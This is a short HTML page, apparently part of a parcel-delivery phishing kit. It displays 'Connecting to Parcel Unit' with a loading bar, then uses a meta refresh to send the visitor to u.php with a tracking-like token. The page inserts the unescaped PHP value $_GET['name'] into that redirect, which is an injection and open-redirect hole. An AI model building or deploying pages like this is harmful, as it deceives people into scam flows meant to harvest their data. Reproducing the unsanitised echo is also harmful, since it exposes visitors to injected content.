<html hola_ext_inject="ready"><head>
<meta http-equiv="refresh" content="2;url=u.php?l=DHl-dTracking_=_JeHFUq_VJOXK0QWHtoGYDw=_JeHFUq_VJOXK0QWHtoGYDw=_JeHFUq_VJOXK0QWHto=<?php echo $_GET['name'];?>" &>
<meta http-equiv="content-type" content="text/html; charset=windows-1252"></head><body hola-ext-player="1"><p>&nbsp;
</p>
<p align="center">
<img src="img/hl.jpg" height="106" width="475"></p>
<p align="center">Connecting to Parcel Unit</p>
<p align="center"><img src="img/bar.gif" height="36" width="495"></p>
<p align="center">&nbsp;</p></body></html>